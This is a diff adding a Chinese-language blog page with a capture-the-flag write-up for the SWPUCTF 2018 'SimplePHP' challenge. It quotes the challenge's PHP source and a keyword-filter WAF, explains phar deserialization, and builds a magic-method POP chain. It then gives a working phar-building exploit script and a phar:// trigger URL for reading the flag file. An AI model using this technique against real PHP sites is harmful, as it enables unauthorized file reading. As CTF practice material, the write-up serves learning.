@@ -1,0 +1,729 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="buuctf,phar反序列化" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/06/08/[SWPUCTF%202018]SimplePHP/">
+
+
+
+  <title>
+[SWPUCTF 2018]SimplePHP - ssti - 刷题笔记 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">[SWPUCTF 2018]SimplePHP
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-06-08 21:00:07">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-06-08T21:00:07+08:00">2024-06-08</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?665986"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?832025"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?624154"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?837026"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?763153"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?51550"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="In 刷题笔记"><span itemprop="name">刷题笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" itemprop="item" rel="index" title="In ssti"><span itemprop="name">ssti</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/06/08/[SWPUCTF%202018]SimplePHP/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="swpuctf-2018simplephp"><a class="anchor" href="#swpuctf-2018simplephp">#</a> [SWPUCTF 2018]SimplePHP</h2>
+<p>有读取文件，能读到如下文件：</p>
+<p>file.php?file=index.php/base.php/upload_file.php/function.php/file.php/class.php</p>
+<p>file.php 文件内容如下：</p>
+<pre><code>&lt;?php 
+header(&quot;content-type:text/html;charset=utf-8&quot;);  
+include 'function.php'; 
+include 'class.php'; 
+ini_set('open_basedir','/var/www/html/'); 
+$file = $_GET[&quot;file&quot;] ? $_GET['file'] : &quot;&quot;; 
+if(empty($file)) &#123; 
+    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
+&#125; 
+$show = new Show(); 
+if(file_exists($file)) &#123; 
+    $show-&gt;source = $file; 
+    $show-&gt;_show(); 
+&#125; else if (!empty($file))&#123; 
+    die('file doesn\'t exists.'); 
+&#125; 
+?&gt; 
+</code></pre>
+<p>注意使用的是 file_exists () 函数。</p>
+<p>class.php 文件内容如下:</p>
+<pre><code>&lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+    public function __construct($name)
+    &#123;
+        $this-&gt;str = $name;
+    &#125;
+    public function __destruct()
+    &#123;
+        $this-&gt;test = $this-&gt;str;
+        echo $this-&gt;test;
+    &#125;
+&#125;
+
+class Show
+&#123;
+    public $source;
+    public $str;
+    public function __construct($file)
+    &#123;
+        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
+        echo $this-&gt;source;
+    &#125;
+    public function __toString()
+    &#123;
+        $content = $this-&gt;str['str']-&gt;source;
+        return $content;
+    &#125;
+    public function __set($key,$value)
+    &#123;
+        $this-&gt;$key = $value;
+    &#125;
+    public function _show()
+    &#123;
+        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) &#123;
+            die('hacker!');
+        &#125; else &#123;
+            highlight_file($this-&gt;source);
+        &#125;
+        
+    &#125;
+    public function __wakeup()
+    &#123;
+        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+            echo &quot;hacker~&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &#123;
+        $this-&gt;params = array();
+    &#125;
+    public function __get($key)
+    &#123;
+        return $this-&gt;get($key);
+    &#125;
+    public function get($key)
+    &#123;
+        if(isset($this-&gt;params[$key])) &#123;
+            $value = $this-&gt;params[$key];
+        &#125; else &#123;
+            $value = &quot;index.php&quot;;
+        &#125;
+        return $this-&gt;file_get($value);
+    &#125;
+    public function file_get($value)
+    &#123;
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    &#125;
+&#125;
+?&gt;
+</code></pre>
+<p>看到 Class 想到反序列化，但是没看到啥 unserialize () 函数</p>
+<pre><code>public function _show()
+&#123;
+    if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this-&gt;source)) &#123;
+        die('hacker!');
+    &#125; else &#123;
+        highlight_file($this-&gt;source);
+    &#125;
+    
+&#125;
+public function __wakeup()
+&#123;
+    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+        echo &quot;hacker~&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>这里有个 WAF，不能直接查看 f1ag.php，所以需要用其他方法读取。很容易想到利用 file_get_contents 或 highlight_file 函数读取文件内容。</p>
+<p>涉及知识点：</p>
+<blockquote>
+<p>除了 unserialize () 来利用反序列化漏洞之外，还可以利用 phar 文件以序列化的形式存储用户自定义的 meta-data 这一特性，扩大 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。</p>
+</blockquote>
+<p>受影响的函数如下：</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004421.png" alt="2" /></p>
+<p>这道题满足这几个条件：</p>
+<ul>
+<li>存在受影响的函数 file_get_contents、file_exists。</li>
+<li>phar 文件能够上传到服务器端。</li>
+<li>没有过滤【:】、【/】、【pchar】等关键词。</li>
+<li>有可用的魔术方法作为 “跳板”。</li>
+</ul>
+<p>file_get_contents () 函数是 file_get 方法中的，file_get 方法在 get 方法中被调用，get 方法在__get 魔术方法中被触发：</p>
+<blockquote>
+<p>__get：当希望访问某个对象的未定义的或者不可访问的属性不报错，我们可以在类里定义__get 方法，这样系统在此刻会自动调用该方法</p>
+</blockquote>
+<p>因此要考虑触发__get 魔术方法，访问一个 Test 类中不存在的属性。</p>
+<p>Show 类有这么一段代码：</p>
+<pre><code>public $source;
+public function __toString()
+&#123;
+    $content = $this-&gt;str['str']-&gt;source;
+    return $content;
+&#125;
+</code></pre>
+<blockquote>
+<p>__toString：用于一个类被当成字符串时应怎样回应。</p>
+</blockquote>
+<p>这里的 source 属性是在 Show 类里的，Test 类里并不存在，因此 str [‘str’] = new Test () 可以触发__get 魔术方法。</p>
+<p>接下来考虑触发__toString () 类，找到能输出东西的地方，在 C1e4r 类里有如下代码：</p>
+<pre><code>public function __destruct()
+&#123;
+    $this-&gt;test = $this-&gt;str;
+    echo $this-&gt;test;
+&#125;
+</code></pre>
+<p>它会在某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p>
+<p>最后总结思路如下：</p>
+<ol>
+<li>通过 C1e4r 类，将 str 赋值为 show 类。（$this-&gt;test = $this-&gt;Show）</li>
+<li>C1e4r 类最后会 echo $this-&gt;test; 触发 Show 类的__toString () 魔术方法</li>
+<li>__toString () 魔术方法执行 $content = this->str[‘str’]->source;将str[‘str’]赋值为Test类，Test类中不存在source属性，触发Test类的__get(key) 魔术方法。</li>
+<li>因为 $value = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>p</mi><mi>a</mi><mi>r</mi><mi>a</mi><mi>m</mi><mi>s</mi><mo stretchy="false">[</mo></mrow><annotation encoding="application/x-tex">this-&gt;params[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mopen">[</span></span></span></span>key]; 所以 params=array (‘source’=&gt;’/var/www/html/fl1g.php’);</li>
+</ol>
+<p>exp 如下：</p>
+<p>需要将 php.ini 中的 phar.readonly 选项设置为 Off，PHPstudy 版本切换 5.5.38。</p>
+<pre><code>&lt;?php
+class C1e4r
+&#123;
+    public $test;
+    public $str;
+&#125;
+class Test
+&#123;
+    public $file;
+    public $params;
+    public function __construct()
+    &#123;
+        $this-&gt;params = array();
+    &#125;
+    public function __get($key)
+    &#123;
+        return $this-&gt;get($key);
+    &#125;
+    public function get($key)
+    &#123;
+        if(isset($this-&gt;params[$key])) &#123;
+            $value = $this-&gt;params[$key];
+        &#125; else &#123;
+            $value = &quot;index.php&quot;;
+        &#125;
+        return $this-&gt;file_get($value);
+    &#125;
+    public function file_get($value)
+    &#123;
+        $text = base64_encode(file_get_contents($value));
+        return $text;
+    &#125;
+&#125;
+class Show
+&#123;
+    public $source;
+    public $str;
+&#125;
+$phar = new Phar(&quot;1.phar&quot;); //后缀名必须为phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
+// 可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?，前面内容不限，但必须以__HALT_COMPILER();?来结尾，否则phar扩展将无法识别这个文件为phar文件
+$t = new Test();
+$t-&gt;params = array(&quot;source&quot;=&gt;&quot;/var/www/html/f1ag.php&quot;);
+$s = new Show();
+$s-&gt;str = array(&quot;str&quot;=&gt;$t);
+$c = new C1e4r();
+$c-&gt;str = $s;
+$phar-&gt;setMetadata($c); //将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+$phar-&gt;stopBuffering();
+</code></pre>
+<p>抓包上传改后缀：</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004422.png" alt="wIq9Vx" /></p>
+<p>找到文件路径，通过查看 function.php 可得知文件存在 upload 文件夹内，恰好这个文件夹可以访问 qwq。</p>
+<blockquote>
+<p>file.php?file=phar://upload/090b0844ab952f0df2b28e1f9bc24dad.jpg</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202503052004423.png" alt="woSN5R" /></p>
+</blockquote>
+<p>base64 解码得到 flag</p>
+<p>出自：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTE0MS5odG1s">https://www.shawroot.cc/1141.html</span></p>
+
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+          <a href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="ic i-tag"></i> phar反序列化</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2025-03-05 20:04:39" itemprop="dateModified" datetime="2025-03-05T20:04:39+08:00">2025-03-05</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/06/08/[SWPUCTF%202018]SimplePHP/" title="[SWPUCTF 2018]SimplePHP">http://odiws.github.io/2024/06/08/[SWPUCTF 2018]SimplePHP/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?803213" title="&#39;[RootersCTF2019]I_&lt;3_Flask&#39;">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> ssti</span>
+  <h3>'[RootersCTF2019]I_<3_Flask'</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/07/25/2019-Web-Unagi/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?744394" title="[CSAWQual2019]Web_Unagi">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[CSAWQual2019]Web_Unagi</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#swpuctf-2018simplephp"><span class="toc-number">1.</span> <span class="toc-text"> [SWPUCTF 2018]SimplePHP</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li><li class="active"><a href="/2024/06/08/%5BSWPUCTF%202018%5DSimplePHP/" rel="bookmark" title="[SWPUCTF 2018]SimplePHP">[SWPUCTF 2018]SimplePHP</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">37</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">9</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">31</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/07/25/2019-Web-Unagi/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" title="谁赢了比赛？">谁赢了比赛？</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/14/springboot-web/" title="springboot_web">springboot_web</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/06/17/ecshop%E5%A4%8D%E7%8E%B0/" title="ecshop复现">ecshop复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/02/26/HMGCTF2022-Fan-Website/" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/misc/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/10/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/" title="[BJDCTF2020]一叶障目">[BJDCTF2020]一叶障目</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/05/21/sqltest/" title="sqltest">sqltest</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/18/JMCTF-2021-GoOSS/" title="[JMCTF_2021]GoOSS">[JMCTF_2021]GoOSS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/" title="[SWPU2019]我有一只马里奥">[SWPU2019]我有一只马里奥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/04/17/springweb/" title="springweb">springweb</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/03/12/GHCTF2025web%E5%A4%8D%E7%8E%B0/" title="GHCTF2025web复现">GHCTF2025web复现</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/06/08/[SWPUCTF 2018]SimplePHP/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
